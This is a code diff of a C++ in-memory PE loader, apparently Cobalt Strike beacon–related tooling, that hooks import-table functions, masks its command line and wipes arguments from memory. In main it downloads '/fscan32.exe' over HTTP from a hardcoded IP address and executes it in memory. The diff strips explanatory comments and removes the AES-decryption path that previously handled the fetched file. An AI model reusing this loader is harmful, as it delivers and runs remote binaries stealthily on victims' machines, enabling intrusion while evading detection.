@@ -251,7 +251,7 @@ BYTE* pImageBase = NULL;
 IMAGE_NT_HEADERS* ntHeader = NULL;
 
 
-//-------------All of these functions are custom-defined versions of functions we hook in the PE's IAT-------------
+
 
 LPWSTR hookGetCommandLineW()
 {
@@ -317,7 +317,7 @@ int __cdecl hookatexit(void(__cdecl* func)(void))
 int __cdecl hookexit(int status)
 {
     //BeaconPrintf(CALLBACK_OUTPUT, "Exit called!\n");
-    //_cexit() causes cmd.exe to break for reasons unknown...
+
     ExitThread(0);
     return 0;
 }
@@ -362,7 +362,7 @@ void masqueradeCmdline()
 }
 
 
-//This array is created manually since CommandLineToArgvA doesn't exist, so manually freeing each item in array
+
 void freeargvA(char** array, int Argc)
 {
     //Wipe cmdline args from beacon memory
@@ -373,7 +373,6 @@ void freeargvA(char** array, int Argc)
     LocalFree(array);
 }
 
-//This array is returned from CommandLineToArgvW so using LocalFree as per MSDN
 void freeargvW(wchar_t** array, int Argc)
 {
     //Wipe cmdline args from beacon memory
@@ -482,7 +481,7 @@ IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
 bool applyReloc(ULONGLONG newBase, ULONGLONG oldBase, PVOID modulePtr, SIZE_T moduleSize)
 {
     IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC);
-    if (relocDir == NULL) /* Cannot relocate - application have no relocation table */
+    if (relocDir == NULL) // 应用没有重定向表
         return false;
 
     size_t maxSize = relocDir->Size;
@@ -803,38 +802,6 @@ int main(int argc, char** argv) {
     std::vector<char> exeData = httpReq.HttpGet("/fscan32.exe");
     std::string str_orign = "vwxyz123456789011111111";
     str_orign = res;
-
-    if (argc != 5) {
-        printf("[+] Usage: %s <Host> <Port> <Cipher> <Key>\n", argv[0]);
-        return 1;
-    }
-
-    char* host = argv[1];
-
-
-    DWORD port = atoi(argv[2]);
-
-
-    char* pe = argv[3];
-
-    char* key = argv[4];
-
-    const size_t cSize1 = strlen(host) + 1;
-    wchar_t* whost = new wchar_t[cSize1];
-    mbstowcs(whost, host, cSize1);
-
-
-    const size_t cSize2 = strlen(pe) + 1;
-    wchar_t* wpe = new wchar_t[cSize2];
-    mbstowcs(wpe, pe, cSize2);
-
-    const size_t cSize3 = strlen(key) + 1;
-    wchar_t* wkey = new wchar_t[cSize3];
-    mbstowcs(wkey, key, cSize3);
-
-
-
-    printf("\n\n[+] Get AES Encrypted PE from %s:%d\n", host, port);
     */
     // 获取一个加密的PE文件
     wchar_t* whost= L"101.42.175.89";
@@ -849,33 +816,6 @@ int main(int argc, char** argv) {
     sz_masqCmd_Ansi = (char*)"moo1";
     PELoader((char*)PE.data, PE.len);
     
-    /*
-    if (!PE.data) {
-        printf("[-] Failed in getting AES Encrypted PE\n");
-        return -1;
-    }
 
-    printf("\n[+] Get AES Key from %s:%d\n", host, port);
-    DATA keyData = GetData(whost, port, wkey);
-    if (!keyData.data) {
-        printf("[-] Failed in getting key\n");
-        return -2;
-    }
-    printf("\n[+] AES PE Address : %p\n", PE.data);
-    printf("\n[+] AES Key Address : %p\n", keyData.data);
-
-    printf("\n[+] Decrypt the PE \n");
-    DecryptAES((char*)PE.data, PE.len, (char*)keyData.data, keyData.len);
-    printf("\n[+] PE Decrypted\n");
-
-    // Fixing command line
-    sz_masqCmd_Ansi = (char*)"whatEver";
-
-    printf("\n[+] Loading and Running PE\n");
-    PELoader((char*)PE.data, PE.len);
-
-    printf("\n[+] Finished\n");
-
-    */
     return 0;
 }
